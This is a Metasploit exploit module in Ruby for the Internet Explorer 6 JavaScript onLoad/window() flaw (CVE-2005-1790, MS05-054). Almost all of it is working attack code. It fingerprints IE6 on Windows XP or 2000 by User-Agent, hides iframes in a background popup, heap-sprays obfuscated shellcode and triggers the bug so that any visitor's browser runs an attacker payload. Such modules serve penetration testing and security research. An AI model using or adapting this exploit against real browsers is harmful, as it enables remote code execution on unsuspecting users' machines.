##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Internet Explorer JavaScript OnLoad Handler Remote Code Execution Vulnerability',
			'Description'    => %q{
				This bug is triggered when the browser handles a JavaScript 'onLoad' handler in
				conjunction with an improperly initialized 'window()' JavaScript function.
				This exploit results in a call to an address lower than the heap. The javascript
				prompt() places our shellcode near where the call operand points to.  We call
				prompt() multiple times in separate iframes to place our return address.
				We hide the prompts in a popup window behind the main window. We spray the heap
				a second time with our shellcode and point the return address to the heap. I use
				a fairly high address to make this exploit more reliable. IE will crash when the
				exploit completes.  Also, please note that Internet Explorer must allow popups
				in order to continue exploitation.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Benjamin Tobias Franz', # Discovery
					'Stuart Pearson',        # Proof of Concept
					'Sam Sharps'             # Metasploit port
				],
			'References'     =>
				[
					['MSB', 'MS05-054'],
					['CVE', '2005-1790'],
					['OSVDB', '17094'],
					['URL', 'http://www.securityfocus.com/bid/13799/info'],
					['URL', 'http://www.cvedetails.com/cve/CVE-2005-1790'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00",
					'Compat'   =>
						{
							'ConnectionType' => '-find',
						},
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Internet Explorer 6 on Windows XP', { 'iframes' => 4 } ],
					[ 'Internet Explorer 6 Windows 2000',  { 'iframes' => 8 } ],
				],
			'DisclosureDate' => 'Nov 21 2005',
			'DefaultTarget'  => 0))
	end

	def exploit
		@var_redir = rand_text_alpha(rand(100)+1)
		super
	end

	def auto_target(cli, request)
		mytarget = nil

		agent = request.headers['User-Agent']
		print_status("Checking user agent: #{agent}")

		if (agent =~ /MSIE 6\.0/ && agent =~ /Windows NT 5\.1/)
			mytarget = targets[0]   # IE6 on XP
		elsif (agent =~ /MSIE 6\.0/ && agent =~ /Windows NT 5\.0/)
			mytarget = targets[1]	# IE6 on 2000
		else
			print_error("Unknown User-Agent #{agent} from #{cli.peerhost}:#{cli.peerport}")
		end

		mytarget
	end


	def on_request_uri(cli, request)
		mytarget   = auto_target(cli, request)
		var_title  = rand_text_alpha(rand(100) + 1)
		func_main  = rand_text_alpha(rand(100) + 1)

		heapspray = ::Rex::Exploitation::JSObfu.new %Q|
function heapspray()
{
	shellcode = unescape('#{Rex::Text.to_unescape(regenerate_payload(cli).encoded)}');
	var bigblock = unescape("#{Rex::Text.to_unescape(make_nops(4))}");
	var headersize = 20;
	var slackspace = headersize + shellcode.length;
	while (bigblock.length < slackspace) bigblock += bigblock;
	var fillblock = bigblock.substring(0,slackspace);
	var block = bigblock.substring(0,bigblock.length - slackspace);
	while (block.length + slackspace < 0x40000) block = block + block + fillblock;
	var memory = new Array();
	for (i = 0; i < 250; i++){ memory[i] = block + shellcode }

	var ret = "";
	var fillmem = "";

	for (i = 0; i < 500; i++)
		ret += unescape("%u0F0F%u0F0F");
	for (i = 0; i < 200; i++)
		fillmem += ret;

	prompt(fillmem, "");
}
|
		heapspray.obfuscate

		nofunc = ::Rex::Exploitation::JSObfu.new %Q|

if (document.location.href.indexOf("#{@var_redir}") == -1)
{
	var counter = 0;


	top.consoleRef = open('','BlankWindow',
	'width=100,height=100'
	+',menubar=0'
	+',toolbar=1'
	+',status=0'
	+',scrollbars=0'
	+',left=1'
	+',top=1'
	+',resizable=1')
	self.focus()


	for (counter = 0; counter < #{mytarget['iframes']}; counter++)
	{
		top.consoleRef.document.writeln('<iframe width=1 height=1 src='+document.location.href+'?p=#{@var_redir}</iframe>');
	}
	document.writeln("<body onload=\\"setTimeout('#{func_main}()',6000)\\">");

}
else
{
	#{heapspray.sym('heapspray')}();
}
|

		nofunc.obfuscate

		main = %Q|
function #{func_main}()
{
	document.write("<TITLE>#{var_title}</TITLE>");
	document.write("<body onload=window();>");

	window.location.reload();
}
|

		html = %Q|
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN">
<html>
<head>
<meta http-equiv="Content-Language" content="en-gb">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<script>
#{nofunc}
#{heapspray}
#{main}
</script>
</head>
<body>
</body>
</html>
|

		print_status("Sending #{self.name} to client #{cli.peerhost}")
		# Transmit the compressed response to the client
		send_response(cli, html, { 'Content-Type' => 'text/html', 'Pragma' => 'no-cache' })

		# Handle the payload
		handler(cli)
	end
end
